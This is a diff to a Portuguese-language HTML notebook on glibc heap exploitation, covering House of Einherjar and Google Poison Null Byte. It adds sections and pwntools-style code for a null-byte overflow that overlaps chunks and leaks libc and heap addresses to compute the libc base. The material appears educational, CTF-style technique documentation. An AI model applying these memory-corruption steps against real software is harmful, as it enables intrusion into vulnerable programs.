@@ -5697,13 +5697,18 @@ altera-lo...</p>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><ul>
 <li><a href="heap/malloc/HouseOfEinherjar.html#prerrequisitos">Prerrequisitos</a></li>
+<li><a href="heap/malloc/HouseOfEinherjar.html#ataque">Ataque</a>
+<ul>
 <li><a href="heap/malloc/HouseOfEinherjar.html#chunk-falso">Chunk falso</a>
 <ul>
 <li><a href="heap/malloc/HouseOfEinherjar.html#obs-libc-">OBS: libc &lt;</a></li>
 </ul>
 </li>
 <li><a href="heap/malloc/HouseOfEinherjar.html#free">Free</a></li>
+</ul>
+</li>
 <li><a href="heap/malloc/HouseOfEinherjar.html#vitima-adjacente-ao-top">Vitima adjacente ao top</a></li>
+<li><a href="heap/malloc/HouseOfEinherjar.html#info-leak">Info leak</a></li>
 </ul>
 <p>Na House of Einherjar, nos queremos que malloc retorne um chunk 
 <strong>FORA</strong> do heap (<code>.data</code>, etc...) usando um 
@@ -5752,7 +5757,8 @@ que alcance o chunk falso:</p>
 <blockquote>
 <p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
 </blockquote>
-<h1 id="chunk-falso"><a class="header" href="#chunk-falso">Chunk falso</a></h1>
+<h1 id="ataque-1"><a class="header" href="#ataque-1">Ataque</a></h1>
+<h2 id="chunk-falso"><a class="header" href="#chunk-falso">Chunk falso</a></h2>
 <p>Alem disso, como nos vamos consolidar, precisaremos passar pelo 
 SAFE unlink... Portanto, basta colocar:</p>
 <blockquote>
@@ -5763,7 +5769,7 @@ nos precisamos que o size do chunk falso também seja:</p>
 <blockquote>
 <p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
 </blockquote>
-<h2 id="obs-libc"><a class="header" href="#obs-libc">OBS: libc &lt;</a></h2>
+<h3 id="obs-libc"><a class="header" href="#obs-libc">OBS: libc &lt;</a></h3>
 <p>Nessas versões do libc, a implementação do 
 <code>corrupted size versus prev size</code> foi mal feita:</p>
 <pre><code class="language-C">if ( __builtin_expect (chunksize(P) != prev_size (next_chunk(P)) ,0))
@@ -5810,7 +5816,7 @@ do <code>size</code>. Com isso, eles sao necessariamente iguais, passando o
 <code>corrupted size versus prev size</code></p>
 <p>Portanto, voce tem no minimo 3 maneiras diferentes de burlar o 
 mecanismo de segurança :D</p>
-<h1 id="free"><a class="header" href="#free">Free</a></h1>
+<h2 id="free"><a class="header" href="#free">Free</a></h2>
 <p>Com tudo isso pronto, basta chamar <code>free()</code> na vitima, que ela 
 sera consolidada com o chunk falso...</p>
 <p>Agora, basta chamar malloc que o chunk falso sera alocado, te 
@@ -5878,11 +5884,28 @@ com ela e com o fake:</p>
 
 </code></pre>
 <p>Com todas as alocações seguintes vindo de la!</p>
+<h1 id="info-leak"><a class="header" href="#info-leak">Info leak</a></h1>
+<p>Para gerar infoleaks, ao envés de consolidar com um chunk falso, 
+consolida com um chunk anterior no heap e usa as técnicas 
+mostradas em:</p>
+<blockquote>
+<p>Google Poison Null Byte: Infoleaks </p>
+</blockquote>
+<p>As duas convergem nesse aspecto</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="google-poison-null-byte"><a class="header" href="#google-poison-null-byte">Google Poison Null Byte</a></h1>
 <ul>
 <li><a href="heap/malloc/GooglePoisonNull.html#google-poison-null-byte">Google Poison Null Byte</a></li>
 <li><a href="heap/malloc/GooglePoisonNull.html#prerrequisitos">Prerrequisitos</a></li>
 <li><a href="heap/malloc/GooglePoisonNull.html#ataque">Ataque</a></li>
+<li><a href="heap/malloc/GooglePoisonNull.html#resumo">Resumo</a></li>
+<li><a href="heap/malloc/GooglePoisonNull.html#info-leaks">info leaks</a>
+<ul>
+<li><a href="heap/malloc/GooglePoisonNull.html#libc">Libc</a></li>
+<li><a href="heap/malloc/GooglePoisonNull.html#heap">Heap</a></li>
+<li><a href="heap/malloc/GooglePoisonNull.html#full">Full</a></li>
+</ul>
+</li>
+<li><a href="heap/malloc/GooglePoisonNull.html#exec">Exec</a></li>
 </ul>
 <p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
 precisávamos usar null bytes no <code>prev_size</code> e dado que overflows 
@@ -5918,7 +5941,7 @@ oposto da House of Einherjar:</p>
 </li>
 <li>Um chunk qualquer para prevenir consolidação com o TOP</li>
 </ul>
-<h1 id="ataque-1"><a class="header" href="#ataque-1">Ataque</a></h1>
+<h1 id="ataque-2"><a class="header" href="#ataque-2">Ataque</a></h1>
 <pre><code class="language-py">chunk_A = malloc(0x18)  # chunk overflow: qualquer tamanho 
 chunk_B = malloc(0x308) # chunk vitima: 0x310 
 chunk_C = malloc(0x98)  # chunk consolidação: size &gt;= 0x90
@@ -6224,12 +6247,88 @@ existe um monte de metadados largados la no meio (por exemplo, no
 espaço DIFF), ou os próprios pointers do chunk_B2
 
 </code></pre>
-<p>Agora com esse primitivo, voce poderia fazer muitas coisas, 
-por exemplo, um libc leak: </p>
-<ul>
-<li><code>chunk_E</code> = <code>malloc</code>(<code>size chunk_B1</code>)</li>
-<li><code>read</code>(<code>chunk_B2</code>)</li>
-</ul>
+<h1 id="resumo-1"><a class="header" href="#resumo-1">Resumo</a></h1>
+<pre><code class="language-py"># Google Poison Null
+
+chunk_A = malloc(0x88)   # Qualquer size
+chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
+chunk_C = malloc(0x88)   # Size normal
+chunk_TOP = malloc(0x88) # Prevenir Consolidação
+
+#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
+free(chunk_B)
+edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0
+
+chunk_B1 = malloc(0x88)
+chunk_B2 = malloc(0x68)
+
+free(chunk_B1)
+free(chunk_C)
+</code></pre>
+<h1 id="info-leaks"><a class="header" href="#info-leaks">info leaks</a></h1>
+<blockquote>
+<p>Essas técnicas também funcionam para a House of Einherjar</p>
+</blockquote>
+<h2 id="libc"><a class="header" href="#libc">Libc</a></h2>
+<p>Para um libc leak, basta alocar a primeira metade do <code>chunk_B + chunk_C</code></p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+</code></pre>
+<p>Os metadados vao parar no chunk_B2, então basta ler o <code>fd</code> ou <code>bk</code> dele</p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+libc_leak = u64(read(chunk_B2, 8))
+</code></pre>
+<h2 id="heap-1"><a class="header" href="#heap-1">Heap</a></h2>
+<p>Para o heap precisamos fazer a mesma coisa que o libc, porem se dermos <code>free()</code> em algum chunk 
+que va para os <strong>UNSORTED</strong>, o chunk_B2.<code>bk</code> vai apontar para ele</p>
+<p>Assim, no read do chunk_B2, vamos precisar separar os dois:</p>
+<pre><code class="language-py">leak = read(chunk_B2, 16)
+free()
+
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; heap_leak
+</code></pre>
+<p>A opção mais fácil é o chunk_A, pq o endereço dele é o mesmo do heap nesse caso</p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+free(chunk_A)
+
+leak = read(chunk_B2, 16)
+
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; chunk_A
+</code></pre>
+<h2 id="full-1"><a class="header" href="#full-1">Full</a></h2>
+<p>Assim, unindo todos os infoleaks</p>
+<pre><code class="language-py"># Google Poison Null
+
+chunk_A = malloc(0x88)   # Qualquer size
+chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
+chunk_C = malloc(0x88)   # Size normal
+chunk_TOP = malloc(0x88) # Prevenir Consolidação
+
+#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
+free(chunk_B)
+edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0
+
+chunk_B1 = malloc(0x88)
+chunk_B2 = malloc(0x68)
+
+free(chunk_B1)
+free(chunk_C)
+
+# Info leaks
+
+chunk_B1 = malloc(0x88)
+free(chunk_A) # unsorted bins -&gt; heap leak
+
+leak = read(chunk_B2, 16)
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; chunk_A
+
+libc.address = libc_leak - libc.sym.main_arena - 88
+#log.success(&quot;Libc Addr (pwndbg: vmmap libc ou libs): &quot;+ hex(libc.sym.__malloc_hook))
+#log.success(&quot;Heap: &quot;+hex(heap_leak))
+</code></pre>
+<h1 id="exec-1"><a class="header" href="#exec-1">Exec</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="unsorted-bins-partial-unlink"><a class="header" href="#unsorted-bins-partial-unlink">Unsorted bins: Partial Unlink</a></h1>
 <p>Nos unsorted bins, nao é necessário fazer um unlink completo.
 Quando procurando um chunk nos unsorted bins, segue o procedimento:</p>
@@ -6592,7 +6691,7 @@ a alocação em si, com na HoO ate usando o crash mitigação nessa alocação a
 nosso favor.</p>
 <p>Porem neses caso, nos queremos que o chunk seja usável quando nos alocamos e 
 que o programa nao crash... então precisaremos mudar um pouco a estrategia ...</p>
-<h2 id="ataque-2"><a class="header" href="#ataque-2">Ataque</a></h2>
+<h2 id="ataque-3"><a class="header" href="#ataque-3">Ataque</a></h2>
 <p>Nos podemos usar o UAF no chunk do heap para alterar o bk, da mesma maneira que 
 faríamos com o ataque dos unsortedbins...</p>
 <p>Assim, vamos supor que o chunk falso sera criado no <code>username</code> (armazenado na 
